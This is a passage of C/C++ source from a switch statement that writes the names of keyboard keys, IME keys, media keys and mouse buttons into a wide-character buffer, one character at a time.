            case F18: *(keyBuffer + keyBufferLength) = L'F'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'1'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'8'; keyBufferLength += 1u; break;
            case F19: *(keyBuffer + keyBufferLength) = L'F'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'1'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'9'; keyBufferLength += 1u; break;
            case F20: *(keyBuffer + keyBufferLength) = L'F'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'2'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'0'; keyBufferLength += 1u; break;
            case F21: *(keyBuffer + keyBufferLength) = L'F'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'2'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'1'; keyBufferLength += 1u; break;
            case F22: *(keyBuffer + keyBufferLength) = L'F'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'2'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'2'; keyBufferLength += 1u; break;
            case F23: *(keyBuffer + keyBufferLength) = L'F'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'2'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'3'; keyBufferLength += 1u; break;
            case F24: *(keyBuffer + keyBufferLength) = L'F'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'2'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'4'; keyBufferLength += 1u; break;
            case Help: *(keyBuffer + keyBufferLength) = L'H'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'l'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'p'; keyBufferLength += 1u; break;
            case Home: *(keyBuffer + keyBufferLength) = L'H'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'o'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'm'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; break;
            case HorizontalTab: *(keyBuffer + keyBufferLength) = L'H'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'o'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'r'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'i'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'z'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'o'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'n'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L't'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'a'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'l'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'T'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'a'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'b'; keyBufferLength += 1u; break;
            case IMEAccept: *(keyBuffer + keyBufferLength) = L'I'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'M'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'E'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L' '; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'A'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'c'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'c'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'p'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L't'; keyBufferLength += 1u; break;
            case IMEConvert: *(keyBuffer + keyBufferLength) = L'I'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'M'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'E'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L' '; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'C'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'o'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'n'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'v'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'r'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L't'; keyBufferLength += 1u; break;
            case IMEFinal: *(keyBuffer + keyBufferLength) = L'I'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'M'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'E'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L' '; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'F'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'i'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'n'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'a'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'l'; keyBufferLength += 1u; break;
            case IMEHanja: *(keyBuffer + keyBufferLength) = L'I'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'M'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'E'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L' '; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'H'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'a'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'n'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'j'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'a'; keyBufferLength += 1u; break;
            case IMEHangul: *(keyBuffer + keyBufferLength) = L'I'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'M'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'E'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L' '; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'H'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'a'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'n'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'g'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'u'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'l'; keyBufferLength += 1u; break;
            case IMEJunja: *(keyBuffer + keyBufferLength) = L'I'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'M'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'E'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L' '; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'J'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'u'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'n'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'j'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'a'; keyBufferLength += 1u; break;
            case IMEKana: *(keyBuffer + keyBufferLength) = L'I'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'M'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'E'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L' '; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'K'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'a'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'n'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'a'; keyBufferLength += 1u; break;
            case IMEKanji: *(keyBuffer + keyBufferLength) = L'I'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'M'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'E'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L' '; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'K'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'a'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'n'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'j'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'i'; keyBufferLength += 1u; break;
            case IMEModeChangeRequest: *(keyBuffer + keyBufferLength) = L'I'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'M'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'E'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L' '; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'M'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'o'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'd'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'-'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'C'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'h'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'a'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'n'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'g'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L' '; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'R'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'q'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'u'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L's'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L't'; keyBufferLength += 1u; break;
            case IMENonConvert: *(keyBuffer + keyBufferLength) = L'I'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'M'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'E'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L' '; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'N'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'o'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'n'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'-'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'C'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'o'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'n'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'v'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'r'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L't'; keyBufferLength += 1u; break;
            case IMEProcess: *(keyBuffer + keyBufferLength) = L'I'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'M'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'E'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L' '; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'P'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'r'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'o'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'c'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L's'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L's'; keyBufferLength += 1u; break;
            case Insert: *(keyBuffer + keyBufferLength) = L'I'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'n'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L's'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'r'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L't'; keyBufferLength += 1u; break;
            case LaunchApplication1: *(keyBuffer + keyBufferLength) = L'L'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'a'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'u'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'n'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'c'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'h'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'A'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'p'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'p'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'l'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'i'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'c'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'a'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L't'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'i'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'o'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'n'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L' '; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'1'; keyBufferLength += 1u; break;
            case LaunchApplication2: *(keyBuffer + keyBufferLength) = L'L'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'a'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'u'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'n'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'c'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'h'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'A'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'p'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'p'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'l'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'i'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'c'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'a'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L't'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'i'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'o'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'n'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L' '; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'2'; keyBufferLength += 1u; break;
            case LeftAlternate: *(keyBuffer + keyBufferLength) = L'L'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'f'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L't'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'A'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'l'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L't'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'r'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'n'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'a'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L't'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; break;
            case LeftArrow: *(keyBuffer + keyBufferLength) = L'L'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'f'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L't'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'A'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'r'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'r'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'o'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'w'; keyBufferLength += 1u; break;
            case LeftControl: *(keyBuffer + keyBufferLength) = L'L'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'f'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L't'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'C'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'o'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'n'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L't'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'r'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'o'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'l'; keyBufferLength += 1u; break;
            case LeftShift: *(keyBuffer + keyBufferLength) = L'L'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'f'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L't'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'S'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'h'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'i'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'f'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L't'; keyBufferLength += 1u; break;
            case LeftWindowsMeta: *(keyBuffer + keyBufferLength) = L'L'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'f'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L't'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'W'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'i'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'n'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'd'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'o'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'w'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L's'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'M'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L't'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'a'; keyBufferLength += 1u; break;
            case MediaNextTrack: *(keyBuffer + keyBufferLength) = L'M'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'd'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'i'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'a'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'N'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'x'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L't'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'T'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'r'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'a'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'c'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'k'; keyBufferLength += 1u; break;
            case MediaPlayPause: *(keyBuffer + keyBufferLength) = L'M'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'd'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'i'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'a'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'P'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'l'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'a'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'y'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'P'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'a'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'u'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L's'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; break;
            case MediaPreviousTrack: *(keyBuffer + keyBufferLength) = L'M'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'd'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'i'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'a'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'P'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'r'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'v'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'i'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'o'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'u'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L's'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'T'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'r'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'a'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'c'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'k'; keyBufferLength += 1u; break;
            case MediaStop: *(keyBuffer + keyBufferLength) = L'M'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'd'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'i'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'a'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'S'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L't'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'o'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'p'; keyBufferLength += 1u; break;
            case MouseLeftButton: *(keyBuffer + keyBufferLength) = L'M'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'o'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'u'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L's'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'L'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'f'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L't'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'B'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'u'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L't'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L't'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'o'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'n'; keyBufferLength += 1u; break;
            case MouseMiddleButton: *(keyBuffer + keyBufferLength) = L'M'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'o'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'u'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L's'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'M'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'i'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'd'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'd'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'l'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'B'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'u'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L't'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L't'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'o'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'n'; keyBufferLength += 1u; break;
            case MouseRightButton: *(keyBuffer + keyBufferLength) = L'M'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'o'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'u'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L's'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'R'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'i'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'g'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'h'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L't'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'B'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'u'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L't'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L't'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'o'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'n'; keyBufferLength += 1u; break;
            case MouseX1Button: *(keyBuffer + keyBufferLength) = L'M'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'o'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'u'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L's'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'X'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'1'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'B'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'u'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L't'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L't'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'o'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'n'; keyBufferLength += 1u; break;
            case MouseX2Button: *(keyBuffer + keyBufferLength) = L'M'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'o'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'u'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L's'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'X'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'2'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'B'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'u'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L't'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L't'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'o'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'n'; keyBufferLength += 1u; break;
            case MultiplierSymbol: *(keyBuffer + keyBufferLength) = L'\u00D7'; keyBufferLength += 1u; break;
            case NumberLock: *(keyBuffer + keyBufferLength) = L'N'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'u'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'm'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'b'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'r'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'L'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'o'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'c'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'k'; keyBufferLength += 1u; break;
